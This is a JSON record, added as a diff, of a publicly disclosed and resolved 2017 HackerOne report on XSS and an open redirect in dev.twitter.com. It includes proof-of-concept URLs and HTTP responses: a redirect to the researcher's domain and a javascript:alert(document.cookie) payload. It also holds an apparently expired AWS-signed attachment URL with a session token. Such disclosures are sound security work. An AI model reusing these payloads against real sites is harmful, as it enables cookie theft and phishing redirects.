@@ -1,0 +1,146 @@
+{
+  "id": 260744,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNjA3NDQ=",
+  "url": "https://hackerone.com/reports/260744",
+  "title": "[dev.twitter.com] XSS and Open Redirect",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2017-08-16T16:30:43.579Z",
+  "submitted_at": "2017-08-16T16:30:43.579Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bobrov",
+    "url": "/bobrov",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 61,
+    "url": "https://hackerone.com/x",
+    "handle": "x",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ikx4ept298unt534kpz4am2bd4zs/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/ikx4ept298unt534kpz4am2bd4zs/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "X (Formerly Twitter)",
+      "twitter_handle": "XSecurity",
+      "website": "https://x.com",
+      "about": "X helps you create and share ideas and information instantly, without barriers."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2017-09-29T23:07:42.313Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-09-28T17:50:02.473Z",
+  "team_member_agreed_on_going_public_at": "2017-09-29T23:07:42.265Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Description\n===\nXSS via Request-URI which requires user interaction. The vulnerability is caused by the difference in the Request-URI processing in the Location header and in the link on the page.\nBy creating an incorrect port in the link on the Location header, you can block the redirection for the FireFox browser. Next, using the difference in the processing, generate a \"javascript\" link on the page.\n\nPoC: Open Redirect\n===\nBrowsers: Chrome, FireFox, Opera\n```\nhttps://dev.twitter.com/https:/%5cblackfan.ru/\n```\nHTTP Response:\n```http\nHTTP/1.1 302 Found\nconnection: close\n...\nlocation: https:/\\blackfan.ru\n```\n\nPoC: XSS\n===\nBrowsers: FireFox\nSteps to reproduce: Open and click the link\n```\nhttps://dev.twitter.com//x:1/:///%01javascript:alert(document.cookie)/\n```\nHTTP Response:\n```http\nHTTP/1.1 302 Found\nconnection: close\n...\nlocation: //x:1/://dev.twitter.com/\u0001javascript:alert(document.cookie)\n...\n\n\n<p>You should be redirected automatically to target URL: <a href=\"\u0001javascript:alert(document.cookie)\">\u0001javascript:alert(document.cookie)</a>.  If not click the link.\n```\n{F213436}\n",
+  "bounty_amount": "1120.0",
+  "formatted_bounty": "$1,120",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 213436,
+      "file_name": "Screenshot_at_20-24-11.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/213/436/afb02d6500aaf740bb8158743d333aac3987297a/Screenshot_at_20-24-11.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_at_20-24-11.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_at_20-24-11.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2TXGU4NH%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T124816Z&X-Amz-Expires=1259&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCZXXLTvdjrV9%2BXTrnagiitpTSxdTNfuwI8JoO87a374wIgGdKdQ7YeIephBMysf3wfpXJkd8udROvqz%2BslCFnteH4qsgUIcBADGgwwMTM2MTkyNzQ4NDkiDJwtqkOHj%2Bhq7hwpISqPBc3oQJzChWjZ7bKD%2BccTmt7LiDYwnp%2FaW49dMRirZ9pIhrCa7YZHTLZ9RBv6n9DI4zg1cmDjgAWLZcLoHEU6HMSY4TZiQ6JhkTxfHY9%2BW8gIq%2FN6zwvc28EGhPI0bXtMQ05CUe9qLU1IqB2QvVi8ljbC0OENAKpHHW%2B4HZPV3ya4m4CUrmIsBEz02u4o%2FTUWBucXelW27TA%2FMHkcbbkFDMVuk57DqG9l6DCv91Gk0it2LxC7b8QipHE3PIzezn29GFbq0x%2FVAy8j5zhCsVA2u3PoLG8UBgJPigFlduO2n54cymHx0Kj1lPCf0XySDYAG7J%2BkbE9frSbqOenAzEKHL%2BbmTLbvIknLt0tHuWNofydq3sKSVRJUGT6kPaXiG6LcZZAjiidzALZPhPiZjjN2NFbT%2B4d3bYuhSBgSzvUsrX%2FU4t82le3n50YJtFXVQ5QFh1yFj%2BasAJo8gy4CzSP0PgdMEiJHxmad%2BFSBk1osw1BNlolWVHoYfecAbexOr2DelWZtvQEFGBxOieL0Wu0EoUhoxEA%2BwcuNd421R9g0jkhW6T1utyXajONBgYVseJBpWnbW%2BkpGImvblpF9NqajpVHpAAFM6sdMLqiQfJ1f2k9nfS8NIMIMr1C%2Fow0E8D%2FBak4EhkqC2z4QmLpn0zQ7nAVSDGC0pvQQ9HVPj%2BqgNB88SHK9rHZSyCSKf4lsEvYbKl40pk9%2FwaWVlfLBHZ9KQh3Sk5kHWBptfVKftWPHgl3kdZnZZoD7zq5BIGAq%2BfkhmJ1PLAj9CcRgLZKxPmL7BwBfMK1j9GipZrFsKu100o2ehZDw7ycR0yKIZpB5BsA2SMtYyPB%2B8lmSAWsiEcgvv%2BCmvle2pB9btBCR6tP%2FsVAwuKWsrgY6sQEOW7UlyhlECgHHWSD1IxQaKIHYvjLM%2FfiTluais8DBgTs2%2B0ozGJfGCvvwGwuCx3AVFBMiYmPRly4WjCK3xXERtAap5VTGJE61OwLy5AbGPGJEzLPgyw2xUSEbhOBlNW9NWCeq3J6Ykb0rxTuobAmesQY2%2FdIFblQ%2FHHBqxCz3Wf7QF6oiRaFXn07SukEwJwLzpGlJ6GkqAxZz63CXWtQishvehwDUwbs0xamAMs2tYiU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f8957658159d18670f5ba45921c6d644c94518d702931e627899c99f442fcf20",
+      "file_size": 40137,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-10-28T17:50:02.517Z",
+  "allow_singular_disclosure_after": -198615493.7807625,
+  "singular_disclosure_allowed": true,
+  "vote_count": 67,
+  "voters": [
+    "davidfegyver",
+    "jensec",
+    "testt0",
+    "sp1d3rs",
+    "p1stachios",
+    "fqdn",
+    "europa",
+    "bobrov",
+    "hunter",
+    "bl4de",
+    "and 57 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 5471,
+      "category": "researcher",
+      "content": "http://blog.blackfan.ru/2017/09/devtwittercom-xss.html",
+      "user": {
+        "id": 2205,
+        "username": "bobrov",
+        "name": "Sergey Bobrov",
+        "bio": "@Black2Fan",
+        "cleared": false,
+        "verified": false,
+        "website": "https://twitter.com/Black2Fan",
+        "location": "Russia",
+        "created_at": "2014-01-14T04:31:42.053Z",
+        "url": "https://hackerone.com/bobrov",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/d7b0d969b6320751e1c58b9e3efff1e228054ee3d8eade5c51c4c79b25513a9c"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": []
+    }
+  ]
+}
